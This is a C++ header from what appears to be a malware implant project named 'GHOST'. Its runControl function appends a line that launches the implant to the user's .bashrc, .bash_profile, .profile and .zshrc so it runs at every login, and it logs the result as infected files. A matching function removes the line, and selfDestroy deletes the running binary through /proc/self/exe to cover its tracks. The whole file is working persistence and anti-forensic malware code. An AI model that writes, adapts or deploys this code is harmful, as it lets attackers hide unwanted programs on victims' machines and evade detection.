#ifndef PERSISTENCE_HPP
#define PERSISTENCE_HPP

#include <cstdlib>

#include "../utils.hpp"

namespace Persistence {
    const std::vector<std::string> RC_TARGETS = {
        #ifdef DEBUG
        ".test"
        #else
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc"
        #endif
    };

    // https://en.wikipedia.org/wiki/RUNCOM
    // configuration files with autorun commands for most shells
    // they are usually owned and writable by user
    // will run on each login
    int runControl(std::string payload = "~/.ghost/GHOST &") {
        LOG_INFO("[PERSISTENCE] RUN CONTROL")

        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            LOG_ERROR("Couldn't find $HOME - unable to continue")
            return 1;
        }

        std::string homeDir(homeEnv);
        int successCount = 0;

        for (const auto& filename : RC_TARGETS) {
            std::string fullPath = homeDir + "/" + filename;

            if (!std::filesystem::exists(fullPath)) {
                LOG_INFO("Skipping {} (file not found)", fullPath)
                continue;
            }

            LOG_INFO("Attempting persistence on {}", fullPath)
            if (Utils::appendToFile(fullPath, payload)) {
                LOG_SUCCESS("Persistence established in {}", fullPath)
                successCount++;
            } else {
                LOG_ERROR("Error appending payload {} to file {}", payload, filename)
            }
        }

        if (successCount > 0) {
            LOG_SUCCESS("[SUMMARY] Infected {} rc files", successCount)
        } else {
            LOG_ERROR("[SUMMARY] Failed to infect any rc files")
        }

        return !(successCount > 0);
    }

    int removeRunControl(std::string payload = "~/.ghost/GHOST &") {
        LOG_INFO("[PERSISTENCE] REMOVING RUN CONTROL")

        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            LOG_ERROR("Couldn't find $HOME - unable to continue")
            return 1;
        }

        std::string homeDir(homeEnv);
        int successCount = 0;

        for (const auto& filename : RC_TARGETS) {
            std::string fullPath = homeDir + "/" + filename;

            if (!std::filesystem::exists(fullPath)) {
                LOG_INFO("Skipping {} (file not found)", fullPath)
                continue;
            }

            LOG_INFO("Attempting to remove persistence from {}", fullPath)
            if (Utils::removeFromFile(fullPath, payload)) {
                LOG_SUCCESS("Persistence removed from {}", fullPath)
                successCount++;
            } else {
                LOG_ERROR("Error removing line {} from file {}", payload, filename)
            }
        }

        if (successCount > 0) {
            LOG_SUCCESS("[SUMMARY] Removed persistence from {} rc files", successCount)
        } else {
            LOG_ERROR("[SUMMARY] Failed to remove persistence from any rc files")
        }

        return !(successCount > 0);
    }

    int selfDestroy() {
        char buffer[PATH_MAX];

        ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
        if (len != -1) {
            buffer[len] = '\0';
            std::string currentPath = buffer;

            if (unlink(currentPath.c_str()) != 0) {
                return -1;
            }
        }

        return 0;
    }
}

#endif